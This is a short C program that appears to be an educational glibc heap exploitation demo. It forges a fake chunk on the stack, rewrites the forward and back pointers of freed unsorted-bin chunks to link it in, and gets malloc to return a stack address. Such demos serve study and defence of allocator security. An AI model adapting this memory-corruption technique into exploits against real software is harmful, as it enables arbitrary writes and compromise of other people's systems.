#include <stdio.h>
#include <stdlib.h>

#define CHUNK_SIZE0 0x420
#define CHUNK_SIZE1 0x080

void main() {
    long *chunk0,
            *chunk1;

    long stack_array[10];

    // Allocate, and free two chunks
    // Insert them into the unsorted bin
    // Allocate chunks in between, to prevent consolidation
    chunk0 = malloc(CHUNK_SIZE0);
    malloc(CHUNK_SIZE1);
    chunk1 = malloc(CHUNK_SIZE0);
    malloc(CHUNK_SIZE1);

    free(chunk0);
    free(chunk1);

    // Create the unsorted bin fake chunk header
    stack_array[0] = 0x00;
    stack_array[1] = 0x41;

    // Next up, we will need to add
    // a fake heap chunk header, right after the end of our fake unsorted bin chunk
    // This is because, there are checks for the next adjacent chunj
    // Since if malloc properly allocated this chunk, there would be one there
    stack_array[8] = 0x40;
    stack_array[9] = 0x50;

    // Set the fwd/bk pointers of our unsorted bin fake chunk
    // So that they point to the two chunks were linking to here
    stack_array[2] = ((long)chunk0 - 0x10); // fwd
    stack_array[3] = ((long)chunk1 - 0x10); // bk

    // Now we will link in our fake chunk
    // via overwriting the fwd/bk ptr
    // of two other chunks in the unsorted bin
    // which we have already linked against
    // with our fake unsorted bin chunk
    chunk0[1] = (long)(stack_array); // bk
    chunk1[0] = (long)(stack_array); // fwd

    // Allocate a new chunk
    // Will not allocate from any of the three unsorted bin chunks
    // Since they are too big
    // Instead, it will allocate from the top chunk (a new chunk)
    // And move two of the chunks into the large bin
    // And the fake unsorted bin chunk into the small bin
    malloc(CHUNK_SIZE0+0x10);

    // Now time to allocate a ptr to the stack
    // This will allocate our fake unsorted bin chunk, that got moved into the small bin
    malloc(0x2c);
}
